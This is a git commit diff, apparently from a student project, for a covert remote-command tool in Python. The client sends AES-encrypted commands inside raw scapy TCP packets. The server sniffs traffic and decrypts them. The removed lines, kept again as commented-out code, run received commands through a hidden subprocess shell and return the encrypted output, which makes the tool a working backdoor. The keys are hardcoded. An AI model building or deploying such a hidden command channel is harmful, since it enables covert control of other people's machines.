81061ef1a09e4c4f2183b51f8fcea2a1f3bc22f1
root <root@localhost.localdomain>
2015-10-15 21:12:50 -0700

    test

--- client.py
+++ client.py
@@ -1,5 +1,6 @@
 import socket
 import sys
+from scapy.all import *
 from Crypto.Cipher import AES
 from Crypto import Random
 
@@ -8,37 +9,69 @@ def usage():
         print "To use: ", sys.argv[0], "[Server IP] [Server Port]"
         sys.exit()
 
-#key to authenticating the packet
-authPacket = "Authenticate packets"
-#Encryption and decryption variables and initialization
-secretKey = "Secret key lost."
-saltySpatoon = "How tough areyou"
-crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
+def sendCommand():
 
-#Connection Variables
-#Will change to commandline arguments
-HOST = "127.0.0.1"
-PORT = 8509
+	#key to authenticating the packet
+	authPacket = "Authenticate packets"
+	#Encryption and decryption variables and initialization
+	secretKey = "Secret key lost."
+	saltySpatoon = "How tough areyou"
+	crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
 
-#Open socket and connect to server
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
+	while True:
+		command = raw_input('Write your command: ')
 
-while True:
-	#User command input to be sent tot he server
-	command = raw_input('Write your command: ')
-	#Encrypt the command as well as the packet authenticator
-	encryptedCommand = crypt.encrypt(authPacket + command)
-	#Send encrypted command to the server
-	s.sendall(encryptedCommand)
-	#Receive the data from the server
-	data = s.recv(10240)
-	#Decrypt the data from the server
-	decryptedData = crypt.decrypt(data)
-	if decryptedData.startswith(authPacket) == True:
-		newData = decryptedData[20:]
-		#Print the output
-		if newData == "exit":
-			sys.exit()
-		else:
-			print newData
+		encryptedCommand = crypt.encrypt(authPacket + command)
+
+		# decryptedData = crypt.decrypt(data)
+
+		# if decryptedData.startswith(authPacket) == True:
+		# 	newData = decryptedData[20:]
+		# 	#Print the output
+		# 	if newData == "exit":
+		# 		sys.exit()
+		# 	else:
+		# 		print newData
+
+
+
+		pkt = IP(src="127.0.0.1", dst="127.0.0.1")/TCP(sport=5000, dport=80, flags="C")/Raw(load=encryptedCommand)
+
+		send(pkt)
+
+sendCommand()
+
+
+
+
+
+
+
+
+# #Connection Variables
+# #Will change to commandline arguments
+# HOST = "127.0.0.1"
+# PORT = 8509
+
+# #Open socket and connect to server
+# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# s.connect((HOST, PORT))
+
+# while True:
+# 	#User command input to be sent tot he server
+# 	command = raw_input('Write your command: ')
+# 	#Encrypt the command as well as the packet authenticator
+# 	encryptedCommand = crypt.encrypt(authPacket + command)
+# 	#Send encrypted command to the server
+# 	s.sendall(encryptedCommand)
+# 	#Receive the data from the server
+# 	data = s.recv(10240)
+# 	#Decrypt the data from the server
+# 	decryptedData = crypt.decrypt(data)
+# 	if decryptedData.startswith(authPacket) == True:
+# 		newData = decryptedData[20:]
+# 		#Print the output
+# 		if newData == "exit":
+# 			sys.exit()
+# 		else:
+# 			print newData
--- server.py
+++ server.py
@@ -18,58 +18,110 @@ def usage():
         print "To use: ", sys.argv[0], "[Server IP] [Server Port] [Client IP]"
         sys.exit()
 
+
 def server(pkt):
 
+	#key to authenticating the packet
+	authPacket = "Authenticate packets"
+	#Encryption and decryption variables and initialization
+	secretKey = "Secret key lost."
+	saltySpatoon = "How tough areyou"
+	crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
+
 	src_ip = pkt[IP].src
-	dst_ip = pkt[IP].dst
-	tcp_sport = pkt[TCP].sport
-	tcp_dport = pkt[TCP].dport
 
-	#Server connections
-	#Will become command line arguments
-	HOST = "127.0.0.1"
-	PORT = 8509
-	clientIP = ""
+	print str(src_ip)
 
-	#will change HOST into clientIP once in real network
-	if src_ip == HOST and dst_ip == HOST:
-		#Opening socket and listening on that socket
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.bind((HOST, PORT))
-		s.listen(1)
-		#Accept connections
-		conn, addr = s.accept()
-		#key to authenticating the packet
-		authPacket = "Authenticate packets"
-		#Encryption and decryption variables and initialization
-		secretKey = "Secret key lost."
-		saltySpatoon = "How tough areyou"
-		crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
+	if src_ip == "127.0.0.1":
 
-		while True:
-			#Receive the data from the client
-			data = conn.recv(10240)
-			#decrypts the data
-			decryptedData = crypt.decrypt(data)
+		data = pkt[Raw].load
 
-			if decryptedData.startswith(authPacket) == True:
-				newData = decryptedData[20:]
-				#if we receive exit, we send exit back to client first then exit the program
-				if newData == "exit":
-					encryptExit = crypt.encrypt(authPacket + newData)
-					conn.send(encryptExit)
-					#wait 2 seconds before closing server
-					time.sleep(2)
-					sys.exit()
-				else:
-					#Run the command using a child process so that it is hidden
-					process = subprocess.Popen(newData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-					#Store the output of the command into output variable
-					output = process.stdout.read() + process.stderr.read()
-					#Encrypt the output and add the packet authenticator before sending back
-					encryptedReply = crypt.encrypt(authPacket + output)
-					conn.sendall(encryptedReply)
-			else:
-				print decryptedData
+		decryptedData = crypt.decrypt(data)
+
+		if decryptedData.startswith(authPacket):
+			newData = decryptedData[20:]
+
+			print newData
+
+
+
+
+
+
+
 
 sniff(filter="tcp", prn=server)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# def server(pkt):
+
+# 	src_ip = pkt[IP].src
+# 	dst_ip = pkt[IP].dst
+# 	tcp_sport = pkt[TCP].sport
+# 	tcp_dport = pkt[TCP].dport
+
+# 	#Server connections
+# 	#Will become command line arguments
+# 	HOST = "127.0.0.1"
+# 	PORT = 8509
+# 	clientIP = ""
+
+# 	#will change HOST into clientIP once in real network
+# 	if src_ip == HOST and dst_ip == HOST:
+# 		#Opening socket and listening on that socket
+# 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# 		s.bind((HOST, PORT))
+# 		s.listen(1)
+# 		#Accept connections
+# 		conn, addr = s.accept()
+
+
+# 		while True:
+# 			#Receive the data from the client
+# 			data = conn.recv(10240)
+# 			#decrypts the data
+# 			decryptedData = crypt.decrypt(data)
+
+# 			if decryptedData.startswith(authPacket) == True:
+# 				newData = decryptedData[20:]
+# 				#if we receive exit, we send exit back to client first then exit the program
+# 				if newData == "exit":
+# 					encryptExit = crypt.encrypt(authPacket + newData)
+# 					conn.send(encryptExit)
+# 					#wait 2 seconds before closing server
+# 					time.sleep(2)
+# 					sys.exit()
+# 				else:
+# 					#Run the command using a child process so that it is hidden
+# 					process = subprocess.Popen(newData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+# 					#Store the output of the command into output variable
+# 					output = process.stdout.read() + process.stderr.read()
+# 					#Encrypt the output and add the packet authenticator before sending back
+# 					encryptedReply = crypt.encrypt(authPacket + output)
+# 					conn.sendall(encryptedReply)
+# 			else:
+# 				print decryptedData
+
+# sniff(filter="tcp", prn=server)
